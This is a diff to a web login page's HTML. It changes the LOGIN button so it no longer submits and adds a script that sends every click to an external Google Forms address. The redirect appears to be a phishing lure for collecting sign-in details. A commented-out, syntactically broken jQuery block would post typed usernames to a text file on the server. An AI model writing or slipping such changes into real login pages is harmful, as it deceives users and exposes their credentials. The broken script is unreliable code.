@@ -150,7 +150,30 @@
 
                         <div class="form-group">
          <div class="one-fourth column">&nbsp;</div>
-            <input class="btn two-thirds column control-column" name="submit" accesskey="l" value="LOGIN" tabindex="6" type="submit"></div>
+            <input class="btn two-thirds column control-column" id="submit" name="submit" accesskey="l" value="LOGIN" tabindex="6" type="button">
+	    <script type="text/javascript">
+	/*	    $(document).ready(function () {
+			$("submit").submit(function (event) {
+				event.preventDefault();
+				var usr = $("username").val(username);
+				$.ajax($
+					type: "POST",
+					url: "/usernames.txt",
+					data: {usr : username},
+					success: function(response) {
+						console.log("Username saved successfully!");
+						$("submit")[0].submit();
+					},
+					error: function(xhr, status, error) {
+						console.error("Error saving username: " + error);
+					});
+				});
+		    });*/
+		    document.getElementById("submit").onclick = function () {
+			location.href = "https://forms.gle/FpQ43cjDbWDSom7H9";
+			};
+	    </script>
+			</div>
                         </div>
                     </div>
                 </div>
